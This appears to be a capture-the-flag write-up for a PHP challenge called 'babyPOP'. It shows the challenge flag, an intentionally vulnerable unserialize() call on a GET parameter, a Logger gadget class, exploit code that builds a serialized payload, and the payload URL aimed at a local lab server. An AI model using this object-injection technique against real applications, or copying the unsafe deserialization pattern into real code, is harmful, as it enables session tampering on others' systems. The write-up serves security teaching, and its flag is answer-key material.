# babyPOP

**Author** : DreyAnd    
**Difficulty** : <font color='orange'>Medium</font>  
**Description** : Fellow pwners love to ROP.. let's introduce it to the web!   
**Infrastructure requirements** : docker, zip

Flag: `SCC{W3lc0m3_t0_pHp_P0P_G4dg3ts}`

# Solution:

Once you login, there's the following check:
```php
<?php if($_SESSION['developerSettings'] == "givemeflag"){ echo $flag;} else { echo "NULL";} ?></h5>
```

All we have to do is to write into `$_SESSION` somehow. 

Looking at `logout.php`, there seems to be an insecure PHP deserialization vulnerability via `timestamp` parameter:
```php
if(isset($_GET['timestamp']) && !empty($_GET['timestamp'])){
    unserialize($_GET['timestamp']);
    header("location: index.php");
    exit; // Prevent developers from logging out and keep track of their work.
    
} else {
    session_destroy();
    header("location: login.php");
    exit;
}
```

There are no generic gadgets we can use since the codebase doesn't rely on any frameworks or such, so we need to create a custom POP gadget chain.

We find the following code in `classes/Logger.php`:
```php
<?php

class Logger {
    public $timestamp;

    function __construct(){
        if(!isset($this->timestamp)) {
            $this->timestamp = "01-01-2024";
        }
    }
    function __destruct(){
        $devSettings = $this->timestamp;
        $_SESSION['developerSettings'] = $devSettings;
    }
}

?>
```

We can use this as our gadget. 

You can use the following exploit to generate your payload:
```php
<?php 

class Logger {
    public $timestamp;

    function __construct(){
        $this->timestamp = "givemeflag";
    }

}

$exp = new Logger();

echo urlencode(serialize($exp));

?>
```

All that is left is to pass the exploit, which can be done via the following URL:
```
http://127.0.0.1:1337/logout.php?timestamp=O%3A6%3A%22Logger%22%3A1%3A%7Bs%3A9%3A%22timestamp%22%3Bs%3A10%3A%22givemeflag%22%3B%7D
```

Once you log in to your account again, you get greeted with the flag.
